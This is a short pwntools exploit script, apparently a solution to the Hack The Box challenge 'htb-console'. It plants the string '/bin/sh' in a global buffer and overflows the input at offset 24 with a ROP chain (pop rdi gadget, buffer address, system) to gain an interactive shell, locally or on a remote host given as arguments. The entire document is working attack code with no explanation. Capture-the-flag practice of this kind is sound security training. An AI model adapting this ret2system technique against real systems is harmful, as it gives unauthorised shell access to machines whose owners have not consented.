from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './htb-console'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

ripEipoffset = 24 
systemAddr = 0x401040 # can grep it with elf.symbols.system
firstLinedatAddr = 0x4040b0 # first memory of dat
popRdi_offset = 0x401473 # pop rdi offset
p = flat(
    {ripEipoffset: [
        popRdi_offset,
        firstLinedatAddr,
        systemAddr
    ]}
)

sh.sendlineafter('>>', 'hof')
sh.sendlineafter(':','/bin/sh') # fill the dat with /bin/sh string

sh.sendlineafter('>>', 'flag')
sh.sendlineafter(':',p)

sh.interactive()
